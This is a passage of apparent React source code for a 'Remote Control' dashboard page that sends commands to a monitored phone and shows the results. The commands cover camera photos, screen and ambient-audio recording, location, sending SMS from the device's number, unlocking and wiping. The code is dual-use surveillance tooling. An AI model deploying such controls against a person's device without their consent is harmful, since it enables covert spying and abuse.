"use client"

import { useState, useEffect, useCallback, useRef } from "react"
import { format, parseISO, isValid, formatDistanceToNow } from "date-fns"
import {
  Camera, Mic, MapPin, Volume2, Vibrate, MessageSquare,
  Lock, Unlock, AlertTriangle, Wifi, WifiOff, RefreshCw,
  ShieldAlert, ShieldCheck, Globe, XCircle, CheckCircle,
  Battery, Clock, Smartphone as SmartphoneIcon, Info, Loader2,
  Image as ImageIcon, ChevronDown, MonitorPlay
} from "lucide-react"

import { PageHeader } from "@/components/shared/page-header"
import { DataTable, ColumnDef } from "@/components/shared/data-table"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Skeleton } from "@/components/ui/skeleton"
import {
  Dialog, DialogContent, DialogHeader, DialogTitle,
  DialogDescription, DialogFooter,
} from "@/components/ui/dialog"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { ScrollArea } from "@/components/ui/scroll-area"
import { toast } from "sonner"

import { useDeviceStore } from "@/lib/stores/device-store"
import { createClient } from "@/lib/supabase/client"
import { useCommandExecutor } from "@/components/dashboard/command-executor"
import { RemoteCommand, Device, InstalledApp } from "@/lib/types/database"
import { cn } from "@/lib/utils"

// ── Types ──────────────────────────────────────────────────────
type PendingState = Record<string, boolean>

interface ResultDialogState {
  open: boolean
  mediaUrl?: string | null
  location?: { lat: number; lng: number } | null
  title?: string
}

// ── Helpers ────────────────────────────────────────────────────
const STATUS_CONFIG: Record<string, { label: string; color: string }> = {
  pending:   { label: "Pending",   color: "bg-yellow-100 text-yellow-800 dark:bg-yellow-900/30 dark:text-yellow-300" },
  sent:      { label: "Sent",      color: "bg-blue-100 text-blue-800 dark:bg-blue-900/30 dark:text-blue-300" },
  delivered: { label: "Delivered", color: "bg-indigo-100 text-indigo-800 dark:bg-indigo-900/30 dark:text-indigo-300" },
  executed:  { label: "Executed",  color: "bg-emerald-100 text-emerald-800 dark:bg-emerald-900/30 dark:text-emerald-300" },
  failed:    { label: "Failed",    color: "bg-rose-100 text-rose-800 dark:bg-rose-900/30 dark:text-rose-300" },
  expired:   { label: "Expired",   color: "bg-slate-100 text-slate-600 dark:bg-slate-800 dark:text-slate-400" },
}

const CMD_LABELS: Record<string, string> = {
  take_photo_front: "📸 Front Photo",
  take_photo_back:  "📸 Back Photo",
  take_screenshot:  "📱 Screenshot",
  record_video:     "📹 Screen Recording",
  record_audio:     "🎙️ Record Audio",
  get_location_now: "📍 Get Location",
  ring_phone:       "🔊 Ring Phone",
  vibrate_phone:    "📳 Vibrate",
  send_sms:         "📨 Send SMS",
  lock_device:      "🔒 Lock Device",
  unlock_device:    "🔓 Unlock Device",
  wipe_data:        "⚠️ Wipe Data",
  enable_wifi:      "📶 Enable Wi-Fi",
  disable_wifi:     "📴 Disable Wi-Fi",
  restart_service:  "🔄 Restart Service",
  block_app:        "🚫 Block App",
  unblock_app:      "✅ Unblock App",
  block_website:    "🚫 Block Website",
  unblock_website:  "✅ Unblock Website",
}

const DURATION_OPTIONS_AUDIO = [1, 2, 5, 10, 15, 20]
const DURATION_OPTIONS_VIDEO = [1, 2, 3, 5, 10]

// ── Command Button Component ───────────────────────────────────
function CmdButton({
  icon, label, description, onClick, variant = "default", pending = false, disabled = false
}: {
  icon: React.ReactNode
  label: string
  description?: string
  onClick: () => void
  variant?: "default" | "danger" | "warning" | "success" | "info"
  pending?: boolean
  disabled?: boolean
}) {
  const variantClasses = {
    default: "border-slate-200 dark:border-slate-800 hover:border-indigo-300 dark:hover:border-indigo-700 hover:bg-indigo-50/50 dark:hover:bg-indigo-900/20",
    danger:  "border-rose-200 dark:border-rose-900/50 hover:border-rose-400 hover:bg-rose-50/50 dark:hover:bg-rose-900/20",
    warning: "border-amber-200 dark:border-amber-900/50 hover:border-amber-400 hover:bg-amber-50/50 dark:hover:bg-amber-900/20",
    success: "border-emerald-200 dark:border-emerald-900/50 hover:border-emerald-400 hover:bg-emerald-50/50 dark:hover:bg-emerald-900/20",
    info:    "border-blue-200 dark:border-blue-900/50 hover:border-blue-400 hover:bg-blue-50/50 dark:hover:bg-blue-900/20",
  }
  const iconBg = {
    default: "bg-indigo-50 dark:bg-indigo-900/30 text-indigo-600 dark:text-indigo-400",
    danger:  "bg-rose-50 dark:bg-rose-900/30 text-rose-600 dark:text-rose-400",
    warning: "bg-amber-50 dark:bg-amber-900/30 text-amber-600 dark:text-amber-400",
    success: "bg-emerald-50 dark:bg-emerald-900/30 text-emerald-600 dark:text-emerald-400",
    info:    "bg-blue-50 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400",
  }

  return (
    <button
      onClick={onClick}
      disabled={pending || disabled}
      className={cn(
        "flex flex-col items-center gap-3 p-4 border rounded-xl text-center transition-all cursor-pointer group disabled:opacity-60 disabled:cursor-not-allowed",
        variantClasses[variant]
      )}
    >
      <div className={cn("h-11 w-11 rounded-xl flex items-center justify-center text-xl shrink-0", iconBg[variant])}>
        {pending ? <Loader2 className="h-5 w-5 animate-spin" /> : icon}
      </div>
      <div className="flex flex-col gap-0.5 min-w-0 w-full">
        <span className="text-xs font-semibold text-slate-800 dark:text-slate-200 leading-tight">{label}</span>
        {description && <span className="text-[10px] text-slate-500 dark:text-slate-400 leading-tight">{description}</span>}
      </div>
      {pending && <Badge variant="outline" className="text-[9px] mt-1 animate-pulse">Running...</Badge>}
    </button>
  )
}

// ── Section Header ─────────────────────────────────────────────
function SectionHeader({ emoji, title }: { emoji: string; title: string }) {
  return (
    <div className="flex items-center gap-2 mt-6 mb-3">
      <span className="text-lg">{emoji}</span>
      <h3 className="text-sm font-bold uppercase tracking-wider text-slate-600 dark:text-slate-400">{title}</h3>
      <div className="flex-1 h-px bg-slate-200 dark:bg-slate-800 ml-2" />
    </div>
  )
}

// ── Main Page ──────────────────────────────────────────────────
export default function RemoteCommandsPage() {
  const { selectedDeviceId } = useDeviceStore()
  const { executeCommand, cleanup } = useCommandExecutor()

  const [device, setDevice] = useState<Device | null>(null)
  const [history, setHistory] = useState<RemoteCommand[]>([])
  const [isHistoryLoading, setIsHistoryLoading] = useState(false)
  const [installedApps, setInstalledApps] = useState<InstalledApp[]>([])
  const [blockedApps, setBlockedApps] = useState<string[]>([])
  const [blockedSites, setBlockedSites] = useState<string[]>([])

  const [pending, setPending] = useState<PendingState>({})

  // Dialog states
  const [audioDlg, setAudioDlg] = useState(false)
  const [audioDuration, setAudioDuration] = useState(5)
  const [videoDlg, setVideoDlg] = useState(false)
  const [videoDuration, setVideoDuration] = useState(2)
  const [smsDlg, setSmsDlg] = useState(false)
  const [smsTo, setSmsTo] = useState("")
  const [smsMsg, setSmsMsg] = useState("")
  const [wipeDlg, setWipeDlg] = useState(false)
  const [wipeConfirm, setWipeConfirm] = useState("")
  const [blockAppDlg, setBlockAppDlg] = useState(false)
  const [selectedBlockApp, setSelectedBlockApp] = useState("")
  const [unblockAppDlg, setUnblockAppDlg] = useState(false)
  const [selectedUnblockApp, setSelectedUnblockApp] = useState("")
  const [blockSiteDlg, setBlockSiteDlg] = useState(false)
  const [siteUrl, setSiteUrl] = useState("")
  const [unblockSiteDlg, setUnblockSiteDlg] = useState(false)
  const [selectedUnblockSite, setSelectedUnblockSite] = useState("")

  // Result preview dialog
  const [resultDlg, setResultDlg] = useState<ResultDialogState>({ open: false })

  // ── Fetch device + history ─────────────────────────────────
  const fetchDevice = useCallback(async () => {
    if (!selectedDeviceId) return
    const supabase = createClient()
    const { data } = await supabase.from("devices").select("*").eq("id", selectedDeviceId).single()
    setDevice(data as unknown as Device)
  }, [selectedDeviceId])

  const fetchHistory = useCallback(async () => {
    if (!selectedDeviceId) return
    setIsHistoryLoading(true)
    const supabase = createClient()
    const { data } = await supabase
      .from("remote_commands")
      .select("*")
      .eq("device_id", selectedDeviceId)
      .order("created_at", { ascending: false })
      .limit(100)
    setHistory((data as RemoteCommand[]) || [])
    setIsHistoryLoading(false)
  }, [selectedDeviceId])

  const fetchAppsAndSettings = useCallback(async () => {
    if (!selectedDeviceId) return
    const supabase = createClient()
    const { data: apps } = await supabase.from("installed_apps").select("id,app_name,package_name,is_blocked").eq("device_id", selectedDeviceId) as any
    setInstalledApps((apps || []))
    setBlockedApps((apps || []).filter((a: InstalledApp) => a.is_blocked).map((a: InstalledApp) => a.app_name || a.package_name))

    const { data: settings } = await supabase.from("device_settings").select("blocked_websites").eq("device_id", selectedDeviceId).single() as any
    setBlockedSites(settings?.blocked_websites || [])
  }, [selectedDeviceId])

  useEffect(() => {
    fetchDevice()
    fetchHistory()
    fetchAppsAndSettings()

    return () => cleanup()
  }, [fetchDevice, fetchHistory, fetchAppsAndSettings, cleanup])

  // Realtime subscription on command history
  useEffect(() => {
    if (!selectedDeviceId) return
    const supabase = createClient()
    const ch = supabase
      .channel(`cmdhist-${selectedDeviceId}`)
      .on("postgres_changes", {
        event: "*",
        schema: "public",
        table: "remote_commands",
        filter: `device_id=eq.${selectedDeviceId}`,
      }, () => {
        fetchHistory()
        fetchDevice()
      })
      .subscribe()

    return () => { ch.unsubscribe() }
  }, [selectedDeviceId, fetchHistory, fetchDevice])

  // ── Execute helper ─────────────────────────────────────────
  const run = useCallback(async (
    cmdType: string,
    params: Record<string, any> = {},
    options?: { onResult?: (r: any) => void }
  ) => {
    if (!selectedDeviceId || !device) return
    setPending(p => ({ ...p, [cmdType]: true }))

    await executeCommand({
      device_id: selectedDeviceId,
      command_type: cmdType,
      parameters: params,
      timeoutMs: 60000,
      onResult: (result) => {
        setPending(p => ({ ...p, [cmdType]: false }))
        if (result.status === "executed" && result.result_media_url) {
          setResultDlg({
            open: true,
            mediaUrl: result.result_media_url,
            title: CMD_LABELS[cmdType] || cmdType,
          })
        }
        if (result.status === "executed" && result.result?.latitude) {
          setResultDlg({
            open: true,
            location: { lat: result.result.latitude, lng: result.result.longitude },
            title: "📍 Device Location",
          })
        }
        options?.onResult?.(result)
        fetchHistory()
      },
    })
  }, [selectedDeviceId, device, executeCommand, fetchHistory])

  // ── History columns ────────────────────────────────────────
  const historyColumns: ColumnDef<RemoteCommand>[] = [
    {
      key: "command_type",
      header: "Command",
      render: (row) => (
        <span className="text-sm font-semibold">{CMD_LABELS[row.command_type] || row.command_type}</span>
      ),
    },
    {
      key: "parameters",
      header: "Parameters",
      render: (row) => (
        <span className="text-xs text-slate-500 font-mono truncate max-w-[160px] block">
          {row.parameters ? JSON.stringify(row.parameters) : "—"}
        </span>
      ),
    },
    {
      key: "status",
      header: "Status",
      render: (row) => {
        const cfg = STATUS_CONFIG[row.status] || STATUS_CONFIG.pending
        return (
          <span className={cn("inline-flex items-center gap-1 text-[11px] font-semibold px-2 py-0.5 rounded-full", cfg.color)}>
            {cfg.label}
          </span>
        )
      },
    },
    {
      key: "created_at",
      header: "Sent",
      render: (row) => (
        <span className="text-xs text-slate-500 whitespace-nowrap">
          {isValid(parseISO(row.created_at)) ? formatDistanceToNow(parseISO(row.created_at), { addSuffix: true }) : "—"}
        </span>
      ),
    },
    {
      key: "executed_at",
      header: "Executed",
      render: (row) => (
        <span className="text-xs text-slate-500 whitespace-nowrap">
          {row.executed_at && isValid(parseISO(row.executed_at)) ? formatDistanceToNow(parseISO(row.executed_at), { addSuffix: true }) : "—"}
        </span>
      ),
    },
    {
      key: "result_media_url",
      header: "Result",
      render: (row) => (
        row.result_media_url ? (
          <Button
            size="sm"
            variant="outline"
            className="h-6 text-[11px] px-2 border-indigo-200 text-indigo-700 dark:border-indigo-800 dark:text-indigo-400"
            onClick={() => setResultDlg({ open: true, mediaUrl: row.result_media_url, title: CMD_LABELS[row.command_type] || row.command_type })}
          >
            View
          </Button>
        ) : <span className="text-xs text-slate-400">—</span>
      ),
    },
  ]

  // ── No device state ────────────────────────────────────────
  if (!selectedDeviceId) {
    return (
      <div className="p-8 pb-20 animate-in fade-in">
        <PageHeader title="🎮 Remote Control" />
        <Card className="flex flex-col items-center justify-center p-12 text-center border-dashed border-2">
          <SmartphoneIcon className="h-10 w-10 text-slate-400 mb-4" />
          <h3 className="text-lg font-semibold mb-2">No Device Selected</h3>
          <p className="text-slate-500 max-w-sm">Select a device from the sidebar to send remote commands.</p>
        </Card>
      </div>
    )
  }

  const isOnline = device?.is_online ?? false

  return (
    <>
      {/* ── Result Preview Dialog ── */}
      <Dialog open={resultDlg.open} onOpenChange={o => !o && setResultDlg({ open: false })}>
        <DialogContent className="sm:max-w-2xl">
          <DialogHeader>
            <DialogTitle>{resultDlg.title}</DialogTitle>
          </DialogHeader>
          <div className="mt-2">
            {resultDlg.mediaUrl && (
              <div className="border rounded-xl overflow-hidden bg-black flex items-center justify-center max-h-[70vh]">
                {resultDlg.mediaUrl.match(/\.(mp4|webm|mov)$/i) ? (
                  <video src={resultDlg.mediaUrl} controls className="max-h-[70vh] w-full" />
                ) : resultDlg.mediaUrl.match(/\.(mp3|wav|ogg|m4a)$/i) ? (
                  <audio src={resultDlg.mediaUrl} controls className="w-full m-4" />
                ) : (
                  <img src={resultDlg.mediaUrl} alt="Command result" className="max-h-[70vh] object-contain" />
                )}
              </div>
            )}
            {resultDlg.location && (
              <div className="p-4 bg-slate-50 dark:bg-slate-900 rounded-xl border text-sm">
                <p className="font-semibold mb-2">📍 Device Location Retrieved:</p>
                <p className="font-mono text-slate-700 dark:text-slate-300">
                  Lat: {resultDlg.location.lat} / Lng: {resultDlg.location.lng}
                </p>
                <a
                    href={`https://www.google.com/maps?q=${resultDlg.location.lat},${resultDlg.location.lng}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="inline-flex items-center px-4 py-2 rounded-md border border-slate-200 text-sm font-medium mt-3 hover:bg-slate-50 transition-colors"
                  >
                    View on Google Maps
                  </a>
              </div>
            )}
          </div>
          {resultDlg.mediaUrl && (
            <DialogFooter>
              <a href={resultDlg.mediaUrl} download target="_blank" rel="noopener noreferrer" className="inline-flex items-center px-4 py-2 rounded-md border border-slate-200 text-sm font-medium hover:bg-slate-50 transition-colors">Download File</a>
            </DialogFooter>
          )}
        </DialogContent>
      </Dialog>

      {/* ── Audio Duration Dialog ── */}
      <Dialog open={audioDlg} onOpenChange={setAudioDlg}>
        <DialogContent className="sm:max-w-xs">
          <DialogHeader>
            <DialogTitle>🎙️ Recording Duration</DialogTitle>
            <DialogDescription>Select how long to record ambient audio.</DialogDescription>
          </DialogHeader>
          <div className="grid grid-cols-3 gap-2 py-2">
            {DURATION_OPTIONS_AUDIO.map(d => (
              <button key={d} onClick={() => setAudioDuration(d)}
                className={cn("border rounded-lg p-3 text-center transition-all",
                  audioDuration === d ? "border-indigo-500 bg-indigo-50 dark:bg-indigo-900/30 text-indigo-700 dark:text-indigo-300 ring-2 ring-indigo-400/50" : "border-slate-200 dark:border-slate-800 hover:border-slate-300"
                )}>
                <span className="text-xl font-bold block">{d}</span>
                <span className="text-[11px] text-slate-500">min</span>
              </button>
            ))}
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setAudioDlg(false)}>Cancel</Button>
            <Button onClick={() => { setAudioDlg(false); run("record_audio", { duration: audioDuration * 60 }) }} className="bg-rose-600 hover:bg-rose-700 text-white">
              Start Recording
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ── Video Duration Dialog ── */}
      <Dialog open={videoDlg} onOpenChange={setVideoDlg}>
        <DialogContent className="sm:max-w-xs">
          <DialogHeader>
            <DialogTitle>📹 Recording Duration</DialogTitle>
            <DialogDescription>Select screen recording duration.</DialogDescription>
          </DialogHeader>
          <div className="grid grid-cols-5 gap-2 py-2">
            {DURATION_OPTIONS_VIDEO.map(d => (
              <button key={d} onClick={() => setVideoDuration(d)}
                className={cn("border rounded-lg p-3 text-center transition-all",
                  videoDuration === d ? "border-indigo-500 bg-indigo-50 dark:bg-indigo-900/30 text-indigo-700 ring-2 ring-indigo-400/50" : "border-slate-200 dark:border-slate-800 hover:border-slate-300"
                )}>
                <span className="text-lg font-bold block">{d}</span>
                <span className="text-[11px] text-slate-500">min</span>
              </button>
            ))}
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setVideoDlg(false)}>Cancel</Button>
            <Button onClick={() => { setVideoDlg(false); run("record_video", { duration: videoDuration * 60 }) }}>
              Start Recording
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ── SMS Dialog ── */}
      <Dialog open={smsDlg} onOpenChange={setSmsDlg}>
        <DialogContent className="sm:max-w-md">
          <DialogHeader>
            <DialogTitle>📨 Send SMS from Device</DialogTitle>
            <DialogDescription>The message will be sent from the monitored device's number.</DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-2">
            <div>
              <Label htmlFor="sms-to">Recipient Number</Label>
              <Input id="sms-to" placeholder="+1 555 123 4567" value={smsTo} onChange={e => setSmsTo(e.target.value)} className="mt-1" />
            </div>
            <div>
              <Label htmlFor="sms-msg">Message</Label>
              <Textarea id="sms-msg" placeholder="Type message..." rows={4} value={smsMsg} onChange={e => setSmsMsg(e.target.value)} className="mt-1 resize-none" />
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => setSmsDlg(false)}>Cancel</Button>
            <Button
              disabled={!smsTo.trim() || !smsMsg.trim()}
              onClick={() => { setSmsDlg(false); run("send_sms", { to: smsTo, message: smsMsg }); setSmsTo(""); setSmsMsg("") }}
              className="bg-indigo-600 hover:bg-indigo-700 text-white"
            >
              Send SMS
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ── Wipe Confirmation Dialog ── */}
      <Dialog open={wipeDlg} onOpenChange={setWipeDlg}>
        <DialogContent className="sm:max-w-md border-rose-200 dark:border-rose-900/60">
          <DialogHeader>
            <DialogTitle className="text-rose-700 dark:text-rose-400 flex items-center gap-2">
              <AlertTriangle className="h-5 w-5" /> ⚠️ Wipe Device Data
            </DialogTitle>
            <DialogDescription className="text-rose-600/80 dark:text-rose-400/70">
              This will permanently erase ALL data on the device (factory reset). This action CANNOT be undone.
            </DialogDescription>
          </DialogHeader>
          <div className="space-y-4 py-2">
            <div className="p-4 bg-rose-50 dark:bg-rose-950/30 border border-rose-200 dark:border-rose-900/50 rounded-lg text-sm text-rose-800 dark:text-rose-300 font-medium">
              All photos, messages, apps, and personal data will be permanently destroyed.
            </div>
            <div>
              <Label htmlFor="wipe-confirm" className="text-rose-700 dark:text-rose-400 font-semibold">
                Type <code className="font-mono bg-rose-100 dark:bg-rose-900/40 px-1 rounded">WIPE</code> to confirm:
              </Label>
              <Input
                id="wipe-confirm"
                className="mt-1 border-rose-300 dark:border-rose-800 focus-visible:ring-rose-500"
                value={wipeConfirm}
                onChange={e => setWipeConfirm(e.target.value)}
              />
            </div>
          </div>
          <DialogFooter>
            <Button variant="outline" onClick={() => { setWipeDlg(false); setWipeConfirm("") }}>Cancel</Button>
            <Button
              variant="destructive"
              disabled={wipeConfirm !== "WIPE"}
              onClick={() => { setWipeDlg(false); setWipeConfirm(""); run("wipe_data", {}) }}
            >
              Permanently Wipe Device
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ── Block App Dialog ── */}
      <Dialog open={blockAppDlg} onOpenChange={setBlockAppDlg}>
        <DialogContent className="sm:max-w-sm">
          <DialogHeader>
            <DialogTitle>🚫 Block Application</DialogTitle>
          </DialogHeader>
          <Select value={selectedBlockApp} onValueChange={(val) => val && setSelectedBlockApp(val)}>
            <SelectTrigger><SelectValue placeholder="Select app to block" /></SelectTrigger>
            <SelectContent>
              {installedApps.filter(a => !a.is_blocked).map(a => (
                <SelectItem key={a.id} value={a.package_name}>{a.app_name || a.package_name}</SelectItem>
              ))}
            </SelectContent>
          </Select>
          <DialogFooter>
            <Button variant="outline" onClick={() => setBlockAppDlg(false)}>Cancel</Button>
            <Button
              variant="destructive"
              disabled={!selectedBlockApp}
              onClick={() => { setBlockAppDlg(false); run("block_app", { package_name: selectedBlockApp }); setSelectedBlockApp("") }}
            >
              Block App
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ── Unblock App Dialog ── */}
      <Dialog open={unblockAppDlg} onOpenChange={setUnblockAppDlg}>
        <DialogContent className="sm:max-w-sm">
          <DialogHeader>
            <DialogTitle>✅ Unblock Application</DialogTitle>
          </DialogHeader>
          <Select value={selectedUnblockApp} onValueChange={(val) => val && setSelectedUnblockApp(val)}>
            <SelectTrigger><SelectValue placeholder="Select app to unblock" /></SelectTrigger>
            <SelectContent>
              {installedApps.filter(a => a.is_blocked).map(a => (
                <SelectItem key={a.id} value={a.package_name}>{a.app_name || a.package_name}</SelectItem>
              ))}
            </SelectContent>
          </Select>
          <DialogFooter>
            <Button variant="outline" onClick={() => setUnblockAppDlg(false)}>Cancel</Button>
            <Button
              disabled={!selectedUnblockApp}
              onClick={() => { setUnblockAppDlg(false); run("unblock_app", { package_name: selectedUnblockApp }); setSelectedUnblockApp("") }}
            >
              Unblock App
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ── Block Website Dialog ── */}
      <Dialog open={blockSiteDlg} onOpenChange={setBlockSiteDlg}>
        <DialogContent className="sm:max-w-sm">
          <DialogHeader>
            <DialogTitle>🚫 Block Website</DialogTitle>
            <DialogDescription>Enter the domain to block (e.g. facebook.com)</DialogDescription>
          </DialogHeader>
          <Input placeholder="example.com" value={siteUrl} onChange={e => setSiteUrl(e.target.value)} />
          <DialogFooter>
            <Button variant="outline" onClick={() => setBlockSiteDlg(false)}>Cancel</Button>
            <Button
              variant="destructive"
              disabled={!siteUrl.trim()}
              onClick={() => { setBlockSiteDlg(false); run("block_website", { url: siteUrl }); setSiteUrl("") }}
            >
              Block Site
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ── Unblock Website Dialog ── */}
      <Dialog open={unblockSiteDlg} onOpenChange={setUnblockSiteDlg}>
        <DialogContent className="sm:max-w-sm">
          <DialogHeader>
            <DialogTitle>✅ Unblock Website</DialogTitle>
          </DialogHeader>
          {blockedSites.length === 0 ? (
            <p className="text-sm text-slate-500 py-2">No blocked websites found.</p>
          ) : (
            <Select value={selectedUnblockSite} onValueChange={(val) => val && setSelectedUnblockSite(val)}>
              <SelectTrigger><SelectValue placeholder="Select website to unblock" /></SelectTrigger>
              <SelectContent>
                {blockedSites.map(s => <SelectItem key={s} value={s}>{s}</SelectItem>)}
              </SelectContent>
            </Select>
          )}
          <DialogFooter>
            <Button variant="outline" onClick={() => setUnblockSiteDlg(false)}>Cancel</Button>
            <Button
              disabled={!selectedUnblockSite}
              onClick={() => { setUnblockSiteDlg(false); run("unblock_website", { url: selectedUnblockSite }); setSelectedUnblockSite("") }}
            >
              Unblock Site
            </Button>
          </DialogFooter>
        </DialogContent>
      </Dialog>

      {/* ─────────────── MAIN CONTENT ─────────────── */}
      <div className="space-y-6 animate-in fade-in pb-20">
        {/* Header */}
        <PageHeader
          title="🎮 Remote Control"
          description="Send commands to the device and monitor execution in real-time."
        />

        {/* Device Status Banner */}
        <div className={cn(
          "flex flex-wrap items-center gap-4 p-4 border rounded-xl shadow-sm",
          isOnline
            ? "bg-emerald-50 border-emerald-200 dark:bg-emerald-950/20 dark:border-emerald-900/50"
            : "bg-amber-50 border-amber-200 dark:bg-amber-950/20 dark:border-amber-900/50"
        )}>
          <div className={cn(
            "h-12 w-12 rounded-xl flex items-center justify-center shrink-0",
            isOnline ? "bg-emerald-100 dark:bg-emerald-900/40" : "bg-amber-100 dark:bg-amber-900/40"
          )}>
            <SmartphoneIcon className={cn("h-6 w-6", isOnline ? "text-emerald-600" : "text-amber-600")} />
          </div>
          <div className="flex flex-col gap-0.5 flex-1 min-w-0">
            <div className="flex items-center gap-2">
              <span className="font-bold text-slate-800 dark:text-slate-100 text-sm">{device?.device_name || "Device"}</span>
              <span className={cn(
                "inline-flex items-center gap-1 text-[10px] font-bold uppercase px-2 py-0.5 rounded-full",
                isOnline ? "bg-emerald-500 text-white" : "bg-amber-500 text-white"
              )}>
                <span className={cn("w-1.5 h-1.5 rounded-full bg-white", isOnline && "animate-pulse")} />
                {isOnline ? "Online" : "Offline"}
              </span>
            </div>
            <p className={cn("text-xs font-medium", isOnline ? "text-emerald-700 dark:text-emerald-400" : "text-amber-700 dark:text-amber-400")}>
              {isOnline
                ? "Device is online and ready to receive commands."
                : "Device is offline. Commands will execute when it reconnects."}
            </p>
          </div>
          <div className="flex items-center gap-4 text-xs text-slate-500 dark:text-slate-400 flex-wrap">
            <div className="flex items-center gap-1.5">
              <Battery className="h-3.5 w-3.5" />
              {device?.battery_level ?? "?"}%
            </div>
            <div className="flex items-center gap-1.5">
              <Clock className="h-3.5 w-3.5" />
              {device?.last_seen && isValid(parseISO(device.last_seen))
                ? `Last seen ${formatDistanceToNow(parseISO(device.last_seen), { addSuffix: true })}`
                : "Unknown last seen"}
            </div>
          </div>
        </div>

        {/* Command Grid */}
        <Card className="border shadow-sm">
          <CardContent className="p-5">
            {/* Camera */}
            <SectionHeader emoji="📸" title="Camera & Screen" />
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
              <CmdButton icon={<Camera />} label="Front Photo" description="Capture selfie camera" variant="info" pending={!!pending["take_photo_front"]} onClick={() => run("take_photo_front", { camera: "front" })} />
              <CmdButton icon={<Camera />} label="Back Photo" description="Capture rear camera" variant="info" pending={!!pending["take_photo_back"]} onClick={() => run("take_photo_back", { camera: "back" })} />
              <CmdButton icon={<ImageIcon />} label="Screenshot" description="Capture current screen" variant="info" pending={!!pending["take_screenshot"]} onClick={() => run("take_screenshot", {})} />
              <CmdButton icon={<MonitorPlay />} label="Screen Recording" description="Record device screen" variant="info" pending={!!pending["record_video"]} onClick={() => setVideoDlg(true)} />
            </div>

            {/* Audio */}
            <SectionHeader emoji="🎙️" title="Audio" />
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
              <CmdButton icon={<Mic />} label="Record Audio" description="Microphone recording" variant="default" pending={!!pending["record_audio"]} onClick={() => setAudioDlg(true)} />
            </div>

            {/* Location */}
            <SectionHeader emoji="📍" title="Location" />
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
              <CmdButton icon={<MapPin />} label="Get Location" description="Ping current position" variant="info" pending={!!pending["get_location_now"]} onClick={() => run("get_location_now", {})} />
            </div>

            {/* Alerts */}
            <SectionHeader emoji="🔊" title="Alerts" />
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
              <CmdButton icon={<Volume2 />} label="Ring Phone" description="Ring for 30 seconds" variant="warning" pending={!!pending["ring_phone"]} onClick={() => run("ring_phone", { duration: 30 })} />
              <CmdButton icon={<Vibrate />} label="Vibrate" description="Vibrate the device" variant="warning" pending={!!pending["vibrate_phone"]} onClick={() => run("vibrate_phone", {})} />
            </div>

            {/* Communication */}
            <SectionHeader emoji="📨" title="Communication" />
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
              <CmdButton icon={<MessageSquare />} label="Send SMS" description="Send text via device" variant="default" pending={!!pending["send_sms"]} onClick={() => setSmsDlg(true)} />
            </div>

            {/* Security */}
            <SectionHeader emoji="🔒" title="Security" />
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
              <CmdButton icon={<Lock />} label="Lock Device" description="Lock screen immediately" variant="warning" pending={!!pending["lock_device"]} onClick={() => { if (confirm("Lock the device immediately?")) run("lock_device", {}) }} />
              <CmdButton icon={<Unlock />} label="Unlock Device" description="Remove screen lock" variant="success" pending={!!pending["unlock_device"]} onClick={() => run("unlock_device", {})} />
              <CmdButton icon={<AlertTriangle />} label="Wipe Data" description="Factory reset device" variant="danger" pending={!!pending["wipe_data"]} onClick={() => setWipeDlg(true)} />
            </div>

            {/* Connectivity */}
            <SectionHeader emoji="📶" title="Connectivity" />
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
              <CmdButton icon={<Wifi />} label="Enable Wi-Fi" description="Turn on Wi-Fi" variant="success" pending={!!pending["enable_wifi"]} onClick={() => run("enable_wifi", {})} />
              <CmdButton icon={<WifiOff />} label="Disable Wi-Fi" description="Turn off Wi-Fi" variant="warning" pending={!!pending["disable_wifi"]} onClick={() => run("disable_wifi", {})} />
            </div>

            {/* System */}
            <SectionHeader emoji="🛠️" title="System" />
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
              <CmdButton icon={<RefreshCw />} label="Restart Service" description="Restart tracker service" variant="default" pending={!!pending["restart_service"]} onClick={() => { if (confirm("Restart the tracker service on the device?")) run("restart_service", {}) }} />
            </div>

            {/* Apps & Sites */}
            <SectionHeader emoji="📦" title="Apps & Websites" />
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
              <CmdButton icon={<ShieldAlert />} label="Block App" description="Block app access" variant="danger" pending={!!pending["block_app"]} onClick={() => setBlockAppDlg(true)} />
              <CmdButton icon={<ShieldCheck />} label="Unblock App" description="Restore app access" variant="success" pending={!!pending["unblock_app"]} onClick={() => setUnblockAppDlg(true)} />
              <CmdButton icon={<Globe />} label="Block Website" description="Block by domain" variant="danger" pending={!!pending["block_website"]} onClick={() => setBlockSiteDlg(true)} />
